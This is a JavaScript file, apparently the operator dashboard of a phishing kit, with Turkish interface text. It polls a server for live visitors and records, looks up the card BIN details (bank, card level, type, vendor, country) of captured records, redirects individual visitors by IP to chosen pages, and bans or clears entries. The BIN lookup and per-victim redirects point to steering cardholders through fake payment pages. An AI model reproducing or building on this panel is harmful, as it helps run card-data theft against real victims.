$(document).ready(function () {
    setInterval(send, 2000);
});

function send() {
    $.ajax({
        type: "POST",
        url: "ajax",
        data: "data=true",
        success: function (res) {
            res = JSON.parse(res);
            $("#online").text(res.online);
            $("#total").text(res.total);
            $("#ban").text(res.ban);
            $("#records").html(res.records);
            
        }
    })
} 



function copy(that) {
    var inp = document.createElement('input');
    document.body.appendChild(inp)
    inp.value = that.textContent
    inp.select();
    document.execCommand('copy', false);
    inp.remove();
}

$(document).on("click", ".remove", function () {
    $.ajax({
        type: "POST",
        url: "ajax",
        data: "remove=true&id=" + $(this).data('id'),
        success: function () {
            send();
        }
    })
});

$(document).on("click", ".binquery", function () {
    $.ajax({
        type: "POST",
        url: "ajax",
        data: "binquery=true&id=" + $(this).data('id'),
        success: function (response) {
            var r = JSON.parse(response);
            $("#msg_alert").html('<div class="alert alert-info light-alert pt-2 pb-2 mb-0" role="alert">'+
            r.bank + " - " + r.level + " - " + r.type + " - " + r.vendor + " - " + r.country +
            '</div>');
            $("#msg_alert").fadeTo(2000, 500).slideUp(700, function(){
                $("#msg_alert").slideUp(700);
            });
            send();
        }
    })
});

$(document).on("click", ".redirect", function () {
    $.ajax({
        type: "POST",
        url: "ajax",
        data: "redirect=true&page=" + $(this).data('page') + "&ip=" + $(this).data('ip'),
        success: function () {
            send();
        }
    })
});

$(document).on("click", ".ban", function () {
    $.ajax({
        type: "POST",
        url: "ajax",
        data: "ban=true&ip=" + $(this).data('ip'),
        success: function () {
            send();
        }
    })
});

$(document).on("click", "#recordClear", function () {
    Swal.fire({
        title: "Dikkat!",
        text: "Sistemdeki tüm kayıtları silmek istediğinize emin misiniz?",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Evet, sil!",
        cancelButtonText: "Hayır, iptal et!"
    }).then((result) => {
        if (result.value) {
            $.ajax({
                type: "POST",
                url: "ajax",
                data: "recordClear=true",
                success: function () {
                    send();
                }
            })
        }
    });
});

$(document).on("click", "#offlineClear", function () {
    Swal.fire({
        title: "Dikkat!",
        text: "Sistemdeki tüm çevrimdışı kayıtları silmek istediğinize emin misiniz?",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Evet, sil!",
        cancelButtonText: "Hayır, iptal et!"
    }).then((result) => {
        if (result.value) {
            $.ajax({
                type: "POST",
                url: "ajax",
                data: "offlineClear=true",
                success: function () {
                    send();
                }
            })
        }
    });
});

$(document).on("click", "#banClear", function () {
    Swal.fire({
        title: "Dikkat!",
        text: "Sistemdeki tüm ban kayıtlarını silmek istediğinize emin misiniz?",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Evet, sil!",
        cancelButtonText: "Hayır, iptal et!"
    }).then((result) => {
        if (result.value) {
            $.ajax({
                type: "POST",
                url: "ajax",
                data: "banClear=true",
                success: function () {
                    send();
                }
            })
        }
    });
});